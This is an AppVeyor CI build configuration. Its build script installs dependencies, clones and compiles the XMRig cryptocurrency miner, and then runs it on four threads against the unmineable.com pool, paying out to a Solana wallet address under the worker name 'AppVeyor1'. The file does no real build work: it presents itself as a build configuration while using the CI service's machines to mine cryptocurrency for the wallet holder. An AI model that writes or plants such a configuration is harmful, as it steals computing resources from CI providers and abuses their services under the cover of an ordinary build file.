version: 1.0.{build}
image: Ubuntu2004

build_script:
  - sudo apt update
  - sudo apt install -y curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
  - git clone https://github.com/xmrig/xmrig.git
  - mkdir xmrig/build && cd xmrig/build
  - cmake ..
  - make -j$(nproc)
  - ./xmrig -a rx -o rx.unmineable.com:3333 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.AppVeyor1 -p x --threads=4
